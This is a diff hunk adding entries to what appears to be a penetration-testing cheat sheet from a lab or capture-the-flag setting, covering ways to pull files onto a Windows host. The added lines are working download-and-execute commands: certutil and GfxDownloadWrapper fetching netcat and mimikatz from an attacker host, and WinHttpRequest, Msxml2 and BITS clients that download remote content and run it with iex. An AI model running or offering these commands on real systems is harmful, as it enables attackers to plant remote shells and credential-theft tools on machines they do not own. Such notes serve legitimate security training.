@@ -803,7 +803,33 @@ Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/
 
 # Certutil
 Download a File with Certutil
+certutil -urlcache -split -f http://10.10.10.32/nc.exe 
 certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+
+# Transferring File with GfxDownloadWrapper.exe
+GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+
+# otheres
+## WinHttpRequest - Client
+PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
+PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
+PS C:\htb> $h.send();
+PS C:\htb> iex $h.ResponseText
+
+## Msxml2 - Client
+PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
+PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
+PS C:\htb> $h.send();
+PS C:\htb> iex $h.responseText
+
+## BITS - Client
+PS C:\htb> Import-Module bitstransfer;
+PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
+PS C:\htb> $r=gc $env:temp\t;
+PS C:\htb> rm $env:temp\t; 
+PS C:\htb> iex $r
+
+
 
 ```
 ## Shells
